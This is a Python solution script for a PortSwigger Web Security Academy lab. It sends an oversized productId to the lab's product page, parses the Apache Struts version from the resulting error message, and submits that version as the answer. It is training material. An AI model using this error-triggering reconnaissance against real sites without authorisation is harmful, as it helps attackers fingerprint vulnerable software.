#!/usr/bin/env python


'''This lab's verbose error messages reveal that it is using a vulnerable version of a third-party framework. To solve the lab, obtain and submit the version number of this framework.

Lab link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages
'''

import requests
import re

lab_id = '0a00008e04128fd183456a5d00f5005d' # change accordign to generated lab_id

# Trigger an error response by fuzzing the product page with an productId paramater
uri = f"https://{lab_id}.web-security-academy.net/product?productId=9999999999999999999999999999999999999999999999999"
r = requests.get(uri)

# The error message reveals that the framework is Apache Struts. We need to extract the version from the response text
if "Apache Struts" in r.text:
    version = re.findall('Apache Struts (\d \d.\d.[\d)]{1,2})', r.text)
    print("Version number " + version[0])

# Submit the number to finish the lab
uri = f"https://{lab_id}.web-security-academy.net/submitSolution"
data = { 'answer' : version[0] }
r2 = requests.post(uri, data=data)
print('finished')